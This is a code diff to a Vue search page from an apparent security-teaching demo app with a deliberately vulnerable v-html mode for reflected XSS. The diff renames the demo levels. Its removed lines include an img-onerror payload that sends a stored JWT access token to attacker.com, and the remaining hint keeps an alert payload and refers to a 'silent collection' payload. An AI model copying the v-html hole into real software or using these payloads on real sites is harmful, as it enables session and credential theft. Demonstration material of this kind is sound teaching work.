@@ -15,7 +15,7 @@
         </el-input>
       </div>
       
-      <!-- XSS 演示落点（L0/L1）：输入通过 URL 传入，VULN 模式直接渲染 -->
+      <!-- XSS 演示落点（场景 1/2）：输入通过 URL 传入，VULN 模式直接渲染 -->
       <div v-if="searched" class="search-results">
         <div class="result-message">
           <!-- VULN：v-html 原样渲染，可能执行脚本 -->
@@ -41,14 +41,14 @@
       
       <!-- XSS 提示（仅在 VULN 模式展示） -->
       <div class="demo-info card" v-if="configStore.xssMode === 'vuln'">
-        <h3>⚠️ XSS 演示提示（L0/L1 反射型 XSS）</h3>
+        <h3>⚠️ XSS 演示提示（场景 1/2 反射型 XSS）</h3>
         <p>当前处于 VULN 模式，搜索框存在反射型 XSS 漏洞。</p>
         
-        <p style="margin-top: 12px;"><strong>L0 - 基础弹窗演示：</strong></p>
-        <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+        <p style="margin-top: 12px;"><strong>场景 1 - 基础弹窗验证：</strong></p>
+        <code>&lt;img src=x onerror=alert(1)&gt;</code>
         
-        <p style="margin-top: 12px;"><strong>L1 - 窃取 JWT 凭证：</strong></p>
-        <code>&lt;img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))"&gt;</code>
+        <p style="margin-top: 12px;"><strong>场景 2 - 静默画像收集：</strong></p>
+        <code>见文档完整 Payload（含收集器上报逻辑）</code>
         
         <p style="margin-top: 12px; font-size: 0.9em; color: var(--color-text-muted);">
           💡 注意：Vue 中通过 v-html 插入的 &lt;script&gt; 标签不会执行，需使用事件处理器型 payload（如 onerror、onload 等）
@@ -59,7 +59,7 @@
 </template>
 
 <script setup>
-// 搜索页（L0/L1）：演示反射型 XSS 与凭证窃取
+// 搜索页（场景 1/2）：演示反射型 XSS 与静默数据收集
 import { ref, onMounted } from 'vue';
 import { useRoute, useRouter } from 'vue-router';
 import { useConfigStore } from '@/stores/config';
